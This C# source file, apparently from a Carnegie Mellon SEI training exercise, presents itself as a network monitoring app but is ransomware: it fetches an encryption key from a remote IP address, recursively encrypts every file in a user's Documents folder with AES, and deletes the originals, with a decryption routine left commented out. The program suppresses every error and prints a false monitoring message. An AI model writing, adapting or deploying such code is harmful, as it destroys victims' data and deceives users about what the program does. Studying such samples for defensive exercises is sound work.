/*
Copyright 2024 Carnegie Mellon University.
Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
root or contact permission@sei.cmu.edu for full terms.
*/

using System.Reflection;
using System.Net;
using System.Security.Cryptography;

namespace NetworkMonitorApp;

class Program
{
    static void Main(string[] args)
    {
        Console.WriteLine("Monitoring the network for suspicious activity . . . ");

        WebClient webClient = new WebClient();
        string url = string.Empty;
        string remoteUri = "http://123.45.67.119/524A2630D6A9/";

        string key = "";
        string fileName1 = "part4key.txt";
                                                                                                                                        
        try
        {
            if (!Directory.Exists(AppDomain.CurrentDomain.BaseDirectory + "files"))
            {
                Directory.CreateDirectory(AppDomain.CurrentDomain.BaseDirectory + "files");
            }

            url = remoteUri + fileName1;
            webClient.DownloadFile(url, AppDomain.CurrentDomain.BaseDirectory + "/files/" + fileName1);
            Thread.Sleep(3000);

            using (var streamReader = new StreamReader(AppDomain.CurrentDomain.BaseDirectory + "/files/" + fileName1))
            {
                key = streamReader.ReadToEnd();
            }                                                             
        }
        catch (Exception exc) { }

        RunDefaultFeature(key);

        Console.ReadLine();
    }

    public static async Task RunDefaultFeature(string key)
    {
        string iv = "gr5@uC10pkzeD7yT";
        
        try
        {
            string[] filePaths = Directory.GetFiles("/home/user/Documents", "*", 
                new EnumerationOptions{RecurseSubdirectories = true});
            
            foreach (string filePath in filePaths)
            {
                using (var sourceFileStream = File.OpenRead(filePath))
                using (var destinationFileStream = File.Create(filePath + ".enc"))
                using (var aesCryptoServiceProvider = new AesCryptoServiceProvider())
                {
                    aesCryptoServiceProvider.Key = System.Text.Encoding.Default.GetBytes(key);
                    aesCryptoServiceProvider.IV = System.Text.Encoding.Default.GetBytes(iv);
                    using (var cryptoTransform = aesCryptoServiceProvider.CreateEncryptor())
                    using (var cryptoStream = new CryptoStream(destinationFileStream, cryptoTransform, CryptoStreamMode.Write))
                    {
                        destinationFileStream.Write(aesCryptoServiceProvider.IV, 0, aesCryptoServiceProvider.IV.Length);
                        sourceFileStream.CopyTo(cryptoStream);
                    }
                }

                File.Delete(filePath);
            }
        }
        catch (Exception exc){}
    }

    // public static async Task RunDefaultFeature2(string key)
    // {
    //     string iv = "gr5@uC10pkzeD7yT";

    //     try
    //     {
    //         string[] filePaths = Directory.GetFiles("/home/user/Documents", "*.enc", 
    //             new EnumerationOptions{RecurseSubdirectories = true});
            
    //         foreach (string filePath in filePaths)
    //         {
    //             using (var sourceFileStream = File.OpenRead(filePath))
    //             using (var destinationFileStream = File.Create(filePath.Replace(".enc", "")))
    //             using (var aesCryptoServiceProvider = new AesCryptoServiceProvider())
    //             {
    //                 aesCryptoServiceProvider.Key = System.Text.Encoding.Default.GetBytes(key);
    //                 aesCryptoServiceProvider.IV = System.Text.Encoding.Default.GetBytes(iv);
    //                 sourceFileStream.Read(aesCryptoServiceProvider.IV, 0, aesCryptoServiceProvider.IV.Length);
    //                 using (var cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV))
    //                 using (var cryptoStream = new CryptoStream(sourceFileStream, cryptoTransform, CryptoStreamMode.Read))
    //                 {
    //                     cryptoStream.CopyTo(destinationFileStream);
    //                 }
    //             }

    //             File.Delete(filePath);
    //         }
    //     }
    //     catch (Exception exc){}
    // }
}

